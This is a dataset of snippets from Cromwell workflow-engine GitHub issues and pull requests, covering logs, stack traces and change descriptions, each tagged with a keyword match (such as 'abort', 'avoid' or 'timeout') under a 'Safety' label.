-R 'rusage[mem=${memory_mb}] span[hosts=1]' \; -M ${memory_mb} \; /usr/bin/env bash ${script}; """""". submit-docker = """"""; module load tools/singularity/3.8.3; SINGULARITY_MOUNTS='<redacted>'; export SINGULARITY_CACHEDIR=$HOME/.singularity/cache; LOCK_FILE=$SINGULARITY_CACHEDIR/singularity_pull_flock. export SINGULARITY_DOCKER_USERNAME=<redacted>; export SINGULARITY_DOCKER_PASSWORD=<redacted>. flock --exclusive --timeout 900 $LOCK_FILE \; singularity exec docker://${docker} \; echo ""Sucessfully pulled ${docker}"". bsub \; -q ${lsf_queue} \; -P ${lsf_project} \; -J ${job_name} \; -cwd ${cwd} \; -o ${out} \; -e ${err} \; -n ${cpu} \; -R 'rusage[mem=${memory_mb}] span[hosts=1]' \; -M ${memory_mb} \; singularity exec --containall $SINGULARITY_MOUNTS --bind ${cwd}:${d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7203:980,timeout,timeout-seconds,980,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7203,1,['timeout'],['timeout-seconds']
Safety,"- 0.22; - local backend; - docker; - single workflow. Upshot: I still have jobs running and cromwell is not shutting down. ```; ^C[2016-10-19 18:29:22,42] [info] WorkflowManagerActor: Received shutdown signal. Aborting all running workflows...; [2016-10-19 18:29:22,42] [info] WorkflowManagerActor Aborting all workflows; [2016-10-19 18:29:22,42] [info] WorkflowExecutionActor [51ee236f]: Abort received. Aborting 8 EJEAs; [2016-10-19 18:29:22,47] [info] WorkflowManagerActor Waiting for all workflows to abort (2 remaining).; [2016-10-19 18:29:22,47] [info] WorkflowManagerActor Waiting for all workflows to abort (1 remaining).; [2016-10-19 18:29:50,48] [info] WorkflowExecutionActor-51ee236f-c31a-48c2-bae7-9246439160b0 [51ee236f]: WorkflowExecutionActor [51ee236f] job aborted: case_gatk_acnv_workflow.HetPulldown:8:; 1; [2016-10-19 18:29:50,52] [warn] WorkflowExecutionActor-51ee236f-c31a-48c2-bae7-9246439160b0 [51ee236f]: WorkflowExecutionActor [51ee236f] received an unhandled message: JobRunning(51ee236f-; c31a-48c2-bae7-9246439160b0:case_gatk_acnv_workflow.HetPulldown:12:1,Some(Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-51ee236f-c31a-48c2-b; ae7-9246439160b0/WorkflowExecutionActor-51ee236f-c31a-48c2-bae7-9246439160b0/51ee236f-c31a-48c2-bae7-9246439160b0-EngineJobExecutionActor-case_gatk_acnv_workflow.HetPulldown:12:1/51ee236f-c; 31a-48c2-bae7-9246439160b0-BackendJobExecutionActor-51ee236f:case_gatk_acnv_workflow.HetPulldown:12:1#636728322])) in state: WorkflowExecutionAbortingState; [2016-10-19 18:29:50,53] [info] SharedFileSystemAsyncJobExecutionActor [51ee236fcase_gatk_acnv_workflow.HetPulldown:12:1]: java -Xmx4g -jar /root/gatk-protected.jar GetHetCoverage --referen; ce /root/case_gatk_acnv_workflow/51ee236f-c31a-48c2-bae7-9246439160b0/call-HetPulldown/shard-12/inputs/data/ref/Homo_sapiens_assembly19.fasta \; --normal /root/case_gatk_acnv_workflow/51ee236f-c31a-48c2-bae7-9246439160b0/call-HetPulldown/shard-12/inputs/d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1600:210,Abort,Aborting,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1600,7,"['Abort', 'abort']","['Abort', 'Aborting', 'abort', 'aborted']"
Safety,"- Added `scalafmt.conf` to the repo, which includes our linting rules.; - This is essentially a copy of the [Leonardo one](https://github.com/DataBiosphere/leonardo/blob/develop/.scalafmt.conf), although I bumped the version and avoided using deprecated syntax. It should be functionally identical.; - Ran the `scalafmt` CLI tool on to apply the formatting rules to all files. We shouldn't need the CLI tool moving forward since IntelliJ is perfectly capable of formatting individual files. ; - Setup:; - Get the `scala` plugin for IntelliJ. You likely already have it.; - Restart IntelliJ. ; - (optional) `Settings > Editor > Code Style > Scala` to turn on ""Reformat on Save"". ; - Planning on creating a Github Action in a a different branch.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7257:229,avoid,avoided,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7257,1,['avoid'],['avoided']
Safety,"- Added recovery functionality using KV service.; - In the next iteration will refactor to use a Doc store (Mongo, Couchbase) generic service implementation or continue using KV service but with a refactor in order to support not just SQL DBs as KV store but any other kind of DB. I think the best may be to work on a DAL or if it's not possible just modify the service to support other providers. Let me know what do you think on this.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1250:8,recover,recovery,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1250,1,['recover'],['recovery']
Safety,- Adds a `JesError` class that maps some known JES errors to custom Exceptions to provide better error messages. Simplistic for now but avoid unnecessary stacktrace and give more explicit error messages.; - Tries to read the return code regardless of the final status of the JES job (even if it failed). If it can read it then the return code will be available in metadata.; - Sets the exec.sh content-type to `text/plain` in gcs so it opens in the browser instead of downloading a files.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1856:136,avoid,avoid,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1856,1,['avoid'],['avoid']
Safety,"- Allow a `0` value for CWL `outDirMin` and `tmpDirMin` resource attributes; - Adds an optional section to the language factory to define a command to run after the user's action that will return output files that can only be known at runtime; - Only defined for CWL for now, which will remove unnecessary pull of jq for WDL tasks on PAPI2; - Docker image and command can both be changed in the configuration; - The PAPI2 logic that handles delocalization of those file strips away some redundant pieces in the delocalized paths to reduce the overall length of the path",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4358:487,redund,redundant,487,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4358,1,['redund'],['redundant']
Safety,"- As sentry may drop some metadata, print the metadata to slf4j.; - For centaur-restarting-cromwell, remember if cromwell was alive, and log more of the connection status.; - Pass more jenkins variables through docker.; - Increase papi v2 cwl conformance test timeout due to problematic test 55.; - Use pr branch name during pr builds.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4021:260,timeout,timeout,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4021,1,['timeout'],['timeout']
Safety,"- Better localization and delocalization of directories in PAPI2 using hidden files to cover for empty directories; - IWDR localization is not baked in the CWL code anymore but left to the backend. This allows for the PAPI backend to opt out of it since localization is done directly on the VM.; - ~~Use configurable `job-shell` instead of hardcoded `/bin/bash`~~ It fixes 117 but also makes a bunch of centaur tests fail, so leaving as is for now.; - Refactors Pipelines conversions in v2 (w/ typeclasses !); - Allow for lazy evaluation of file and directory literals so that they can be written when the backend and the appropriate IoFunctions are known. This only partially covers the possible cases. It needs a deeper tech talk discussion. This is orthogonal to the above and only here to avoid a later rebase (the files changed overlap with the refactoring mentioned).; - Partially replaces the custom `MemorySize` with [squants](https://github.com/typelevel/squants); - Turns the CPU runtime validation from an `Int` to a `Int Refined Positive`; - Automatically fits the resources requirements in the task to the [GCE constraints](https://cloud.google.com/compute/docs/instances/creating-instance-with-custom-machine-type#specifications)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3697:793,avoid,avoid,793,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3697,1,['avoid'],['avoid']
Safety,"- Cleans up the `IoFunctionSet` a little and add `PathFunctionSet` in it to deal with path manipulation that doesn't involve I/O; - When secondary files are actually secondary directories, list their content and return a `WomMaybeListedDirectory` instead of a `WomSingleFile` or `WomMaybePopulatedFile`; - Make paths absolute as much and as early as possible to avoid ambiguity and having to guess later where they are relative to; - Adjust the `OutputManipulator` to deal with secondary listed directories",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3468:362,avoid,avoid,362,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3468,1,['avoid'],['avoid']
Safety,"- Combines the hotfix and regular release graphs into a single diagram; - Removes the redundant ""re-run swatomation"" step from the end of the release process; - Add the creation of a new ""work in progress version"" PR to firecloud-develop. Rendered Image: . ![](https://github.com/broadinstitute/cromwell/blob/cjl_release_process_fixup/scripts/release_processes/firecloud-develop.dot.png?raw=true)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4962:86,redund,redundant,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4962,1,['redund'],['redundant']
Safety,"- Disabled redundant `lots_of_inputs.test` test, which uses `lots_of_inputs.wdl` like `lots_of_inputs_papiv2.test` and makes analysis confusing; - Removed unused configs, mostly from PAPIv2 Alpha; - Removed unused suites, mostly from PAPIv2 Alpha; - Removed Travis, Jenkins, and CircleCI references from `test.inc.sh`. This includes `case` statements, as well as all functions that were called exclusively in the removed `case` statements.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7336:11,redund,redundant,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7336,1,['redund'],['redundant']
Safety,- Github Actions was throwing a warning because it detected a crash in the script it was running.; - The crash it was seeing was something intentional triggered by a test. We don't want a warning about it. ; - Temporarily redirected stderr so that Github Actions doesn't see the crash.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7106:51,detect,detected,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7106,1,['detect'],['detected']
Safety,- Instruments workflows in OnHold and Aborting; - Instruments the last state the EJEA is before stopping itself,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4398:38,Abort,Aborting,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4398,1,['Abort'],['Aborting']
Safety,"- JES backend. ```; ...snip....; [2016-11-03 19:36:22,19] [info] SingleWorkflowRunnerActor writing metadata to /home/lichtens/test_eval/crsp_validation_input_files/crsp_validation_from_cromwell.json.metadata.json; [2016-11-03 19:36:22,30] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; [2016-11-03 19:36:22,30] [info] WorkflowManagerActor: Received shutdown signal.; [2016-11-03 19:36:22,30] [info] Waiting for 1 workflows to abort...; ....15 minutes gone by....; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649:456,abort,abort,456,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649,1,['abort'],['abort']
Safety,"- JES backend; - 0.24; - single workflow mode. When JES returns a 403 AccessDeniedException, should cromwell keep retrying? It delays the result getting back to the user and should have no way of recovering with retries. Proposed solution: When AccessDeniedException is seen from JES, simply end there, instead of initiating any retries...",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961:196,recover,recovering,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961,1,['recover'],['recovering']
Safety,- Prefix default locations in CWL with `gs://...` root for PAPI conformance tests; - Retrieve size of files early to avoid unnecessary I/O (there's still too much redundant I/O but it's a step); - Uses `WomObject` to map back JS objects instead of `WomMap` that needs homogoneous value type (or it ends up being `WomAnyType`,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3492:117,avoid,avoid,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3492,2,"['avoid', 'redund']","['avoid', 'redundant']"
Safety,"- Refactor all CI TRAVIS_* variables back into create_build_variables(); - Detect hotfixes using git instead of TRAVIS variables; - Using ""force ci"" now runs all sub builds even on push; - All centaur tests should contribute to codecov; - Moved ci source files under src/ci; - Write ci log files under target/ci instead of $PWD; - Write ci generated files under target/ci, instead of sending secrets to src; - Jar file searches now return most recently modified jar; - Added allowPublicKeyRetrieval=true to MySQL url generation; - Removed cloudwell test as the combo of horicromtal + deadlock tests the same features",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5202:75,Detect,Detect,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5202,1,['Detect'],['Detect']
Safety,"- Removed `martha_v2` response parsing; - When traversing files using a mapper function then mapper does the exclusion; - Use serialized class instead of config string replace for Martha request generation; - Request partial responses from Martha; - Use JDK standard responses for missing file attributes (size=0, time=epoch, hash=None); - Copy `timeCreated` from DOS/DRS to file attributes; - Martha `read_string()` uses `gsUri` (gs://bucket/name) instead of `bucket` and `name`; - Martha localization uses safer file paths still based on the DOS/DRS URI; - Reading DOS/DRS content uses the config google auth type, not always Bond-or-USA; - Google config auth types support ADC=SA, passing in scopes to ADC; - Google auth type `UserMode` no longer requires config values that it was ignoring; - Allow skipping docker build-and-push by specifying the `CROMWELL_BUILD_PAPI_DOCKER_IMAGE_DRS`; - `papi-v2-usa` backend now ALWAYS uses the USA just like Terra/FC does",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5912:508,safe,safer,508,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5912,1,['safe'],['safer']
Safety,"- Removes the ability to abort Finalization Actor; - Ensures that the finalization actor runs if the Workflow reaches the `Initialize` state, regardless of what happens next (failure, success, abort), or when it happens (initialization, execution).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/916:25,abort,abort,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/916,2,['abort'],['abort']
Safety,"- Removes the awkward plateauing of running jobs at 2k, 4k, 6k, etc when running several thousand jobs concurrently.; - Does not introduce very long delays into execution store processing like the previous attempt to ""fix"" the execution store.; - Allows us to get a more accurate count of total jobs queued in the system because they will express themselves as EJEAs waiting for tokens rather than pre-queue-queued items of which we have no visibility.; - Adds a dummy backend to test all of the above. Review Notes:; * Start with the `Remove redundant WaitingForQueueSpace status` commit. That's the one which fixes the bug. Everything else is just dummy backend and test infrastructure.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6047:543,redund,redundant,543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6047,1,['redund'],['redundant']
Safety,"- Send abort requests through the `JesAPIQueryManager`. This is wanted because currently each JABJEA aborts on its own which has undesired consequences, like flooding the backend thread pool with blocking requests.; - Lift the ""1 second"" maximum limit of the `JesPollingActor` by switching to milliseconds (new limit is 1 millisecond); - Add a second `JesPollingActor` to help with throughput of PAPI requests",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3357:7,abort,abort,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3357,2,['abort'],"['abort', 'aborts']"
Safety,"- Single workflow mode; - Local backend (using throttling in custom application.conf); - 0.22; - using docker images; - call-caching enabled (localhost mysql instance); - all data is on local filesystem (not even shared filesystem); - N=2; - One time took 6 minutes before I did ctl-C. The second time it was left overnight and never completed. I did notice that (before I hit Ctl-C) cromwell got the shutdown signal and was aborting running jobs, even though there were none. If this was desired behavior, is there a flag to disable?. What other information can I provide? WDL? application.conf is attached. No other `-D` command line parameters were used. [local_application.conf.txt](https://github.com/broadinstitute/cromwell/files/539083/local_application.conf.txt). I am attempting to run cromwell as part of a larger shell script and I am positive that cromwell is not exiting (I still see MySQL warning messages). The workflow results appear to be there and no jobs are running (according to `top -c`)...",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1594:425,abort,aborting,425,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1594,1,['abort'],['aborting']
Safety,"- Upgraded Liquibase to latest; - ~Workaround Liquibase UniqueConstraint ""caching"" bug~ EDIT: Bug was fixed in liquibase!; - Fixed S3 SPI config to avoid Liquibase warnings; - Removed unused DB upgrade environment variables; - Test various DB combinations using centaur local",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091:148,avoid,avoid,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091,1,['avoid'],['avoid']
Safety,"- [x] Needs https://github.com/broadinstitute/wdl4s/pull/47; - [x] Needs https://github.com/broadinstitute/centaur/pull/114; - [x] Needs WDL doc; - [x] Needs Cromwell doc. What it does in a nutshell:. - Enables sub workflows execution; - Sub workflow metadata can be queried separately or injected in the main workflow metadata; - Restarts work; - Aborts should work (work meaning what abort is doing in develop now). To be addressed:; - ~~Sub Workflow Store cleanup~~; - ~~Workflow outputs copying~~ -> https://github.com/broadinstitute/cromwell/issues/1684; - ~~Call logs copying~~; - ~~Provenance: More related to imports, but right now the actual WDL content of a sub workflow is unknown to cromwell (it's in the `WdlNamespace` as a scala object but the actual text is not available).~~; - ~~Stats Endpoint~~",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1682:348,Abort,Aborts,348,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1682,2,"['Abort', 'abort']","['Aborts', 'abort']"
Safety,"- branch 0.19_hotfix a6f7c00b71dd22485d5e95c9a30f3dedd2ddeaba; - running with default application.conf. If I abort a running job via POST to the API endpoint `worflows/v1/<uuid>/abort`, this appears in the server logs:. > 2016-05-23 10:21:55,192 cromwell-system-akka.actor.default-dispatcher-6 INFO - CallActor [UUID(87ebf02f):Godot]: Abort function called.; > 2016-05-23 10:21:55,201 cromwell-system-akka.actor.default-dispatcher-5 INFO - WorkflowActor [UUID(87ebf02f)]: Beginning transition from Running to Aborting.; > 2016-05-23 10:21:55,201 cromwell-system-akka.actor.default-dispatcher-5 INFO - WorkflowActor [UUID(87ebf02f)]: transitioning from Running to Aborting.; > 2016-05-23 10:22:00,175 cromwell-system-akka.actor.default-dispatcher-8 INFO - LocalBackend [UUID(87ebf02f):Godot]: Return code: 0; > 2016-05-23 10:22:00,313 cromwell-system-akka.actor.default-dispatcher-2 ERROR - WorkflowActor [UUID(87ebf02f)]: Completion work failed for call Godot.; > java.sql.SQLIntegrityConstraintViolationException: integrity constraint violation: unique constraint or index violation; UK_SYM_WORKFLOW_EXECUTION_ID_SCOPE_NAME_ITERATION_IO table: SYMBOL; > at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.jdbc.JDBCPreparedStatement.fetchResult(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.jdbc.JDBCPreparedStatement.executeUpdate(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at com.zaxxer.hikari.proxy.PreparedStatementProxy.executeUpdate(PreparedStatementProxy.java:61) ~[cromwell-0.19.jar:0.19]; > at com.zaxxer.hikari.proxy.PreparedStatementJavassistProxy.executeUpdate(PreparedStatementJavassistProxy.java) ~[cromwell-0.19.jar:0.19]; > at slick.driver.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction$$anonfun$run$8$$anonfun$apply$1.apply(JdbcActionComponent.scala:520) ~[cromwell-0.19.jar:0.19]; > at slick.driver.JdbcActionComponen",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/869:109,abort,abort,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/869,5,"['Abort', 'abort']","['Abort', 'Aborting', 'abort']"
Safety,"- cromwell 26; - JES backend; - call caching on local mysql instance; - server mode. Ran a bunch of the initial jobs, but once it really started fan out (thousands of jobs), I got this error message. Trying to replicate now, but not sure if I can. Might be transient. . Regardless, error message is not particularly helpful. Any ideas? . ```; cromwell.core.CromwellFatalException: com.google.cloud.storage.StorageException: 410 Gone; {; ""error"": {; ""errors"": [; {; ""domain"": ""global"",; ""reason"": ""backendError"",; ""message"": ""Backend Error""; }; ],; ""code"": 503,; ""message"": ""Backend Error""; }; }. at cromwell.core.CromwellFatalException$.apply(core.scala:17); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:36); at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.for",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2215:853,recover,recoverWith,853,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2215,2,['recover'],['recoverWith']
Safety,"- cromwell pre-0.21 dev snaposhot; - JES backend; - command line execution (single workflow) . Some docker images are bigger than the default boot disk size for JES backend. There should be some safeguards against failure when the docker image is too big to fit in the default boot disk size. What happens?; 1. JES tries to download docker image that is bigger than the VM boot disk size. Disk full error message appears.; 2. Workflow fails. Proposed behavior:. After number 1 happens, attempt to spin the VM with additional boot disk storage and retry running the job.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1449:195,safe,safeguards,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1449,1,['safe'],['safeguards']
Safety,"- cromwell pre-0.21 dev snapshot; - JES backend; - command line execution (single workflow) . Current behavior, which happens frequently:; - Mysterious error 500 appears on cromwell stdout. Apologies that I do not have example. ; - cromwell hangs. One time, cromwell was left running overnight and no progress was made.; - ctl-c which ends cromwell; - up arrow and return; - job completes successfully. Can cromwell detect these errors on JES and retry the jobs?. More observations:; - These were never seen on local backend. On JES, these were common.; - All jobs were self-contained. I.e. did not hit a web service nor make a HTTP request.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1450:416,detect,detect,416,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1450,1,['detect'],['detect']
Safety,"---- ; > jgentry@broadinstitute.org <jgentry@broadinstitute.org> #14 Jan 17, 2018 03:13PM ; > Hi - ; > ; > In the past we've been told that Message 13 was a generic catch all for ; > something unexpected happening. For instance I'm pretty sure (but don't ; > have data to back this up) that we see 13s when not running a preemptible ; > instance. ; > ; > Cromwell retries both messages, but treats them differently. It will simply ; > retry on a 13, but for preemptibles we will switch from using a preemptible ; > to a standard instance after N preemptions. ; > ; > J ; > ; > ------------------------------- ; > gdk@google.com <gdk@google.com> #15 Jan 17, 2018 05:01PM ; > Hi Henry, Jeff,; > Message 13 can occur with non-preemptible instances as well. In cases where the controller sees an error and exits, if the PAPI servers don't see the instance shutting down then you'll see an error 13 as well.; > ; > I think the solution is to not differentiate your behavior on the content of the returned message, and always retry if the operation is showing as aborted and the instance was preemptible. > ------------------------------- ; > ferrara@broadinstitute.org <ferrara@broadinstitute.org> #16 Jan 18, 2018 07:20AM ; > Can Message 14's occur with non-preemptible instances? Like Message 13s cane?. > ------------------------------- ; > jgentry@broadinstitute.org <jgentry@broadinstitute.org> #17 Jan 18, 2018 10:26AM ; > hi - ; > ; > So is it the case that 100% of the time one receives a message 13 that it's ; > a preemption? ; > ; > The problem is that we keep them on separate counters so as to maximize the ; > number of preemptible tries a user gets (we try preemptibles up to N times ; > before falling back to a standard instance) but will retry other retryable ; > errors on their own count. If we're treating transient errors as ; > preemptible when they're not people can wind up on a standard instance ; > before it's necessary. ; > ; > If it's not 100%, is there any way for the error",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3157:11562,abort,aborted,11562,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3157,1,['abort'],['aborted']
Safety,"-21 15:09:44,61] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-11-21 15:09:44,61] [info] WorkflowStoreActor stopped; [2018-11-21 15:09:44,61] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-11-21 15:09:44,62] [info] WorkflowLogCopyRouter stopped; [2018-11-21 15:09:44,62] [info] JobExecutionTokenDispenser stopped; [2018-11-21 15:09:44,62] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor All workflows finished; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor stopped; [2018-11-21 15:09:44,62] [info] Connection pools shut down; [2018-11-21 15:09:44,62] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] SubWorkflowStoreActor stopped; [2018-11-21 15:09:44,63] [info] JobStoreActor stopped; [2018-11-21 15:09:44,63] [info] DockerHashActor stopped; [2018-11-21 15:09:44,63] [info] IoProxy stopped; [2018-11-21 15:09:44,63] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-11-21 15:09:44,63] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-11-21 15:09:44,63] [info] CallCacheWriteActor stopped; [2018-11-21 15:09:44,63] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-11-21 15:09:44,63] [info] ServiceRegistryActor stopped; [2018-11-21 15:09:44,65] [info] Database closed; [2018-11-21 15:09:44,65] [info] Stream materializer shut down; [2018-11-21 15:09:44,66] [info] WDL HTTP import resolver closed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:5810,Timeout,Timeout,5810,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,3,['Timeout'],['Timeout']
Safety,-7ce25791-3731-4a69-97f1-b7b65ac8ff71)); java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:805); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:804); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.execute(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:829); 	at scala.util.Try$.apply(Try.scala:210); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recoverAsync(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1253); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:1248); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.executeOrRecover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at 